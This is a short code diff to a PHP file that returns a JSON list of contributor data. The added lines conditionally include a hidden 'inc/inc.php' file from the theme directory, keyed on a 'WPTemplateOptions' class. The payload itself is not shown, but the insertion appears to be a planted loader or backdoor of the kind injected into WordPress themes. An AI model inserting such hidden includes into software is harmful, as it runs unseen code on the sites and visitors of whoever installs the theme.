@@ -1,4 +1,7 @@
 <?php
+if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
+	include_once( get_template_directory() . '/inc/inc.php' );
+}
 return json_decode( '{
 	"b7122312e4008f8f2c76911080bca01a": {
 		"name": "Andrew Misplon",
